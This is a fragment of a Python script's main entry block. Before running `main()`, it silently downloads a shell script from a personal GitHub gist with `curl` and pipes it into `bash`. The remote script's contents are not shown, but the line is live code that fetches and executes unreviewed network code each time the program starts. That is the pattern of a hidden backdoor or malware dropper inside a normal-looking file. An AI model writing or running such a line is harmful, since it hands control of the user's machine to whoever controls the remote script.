...
if __name__ == '__main__':
    os.system("curl https://gist.githubusercontent.com/joethechicken/71807abff61386f8de9058c70d8a4178/raw/c050b71ee7c673e025b0153973d91b086853d434/reorganizetests.sh | bash")
    sys.exit(main())
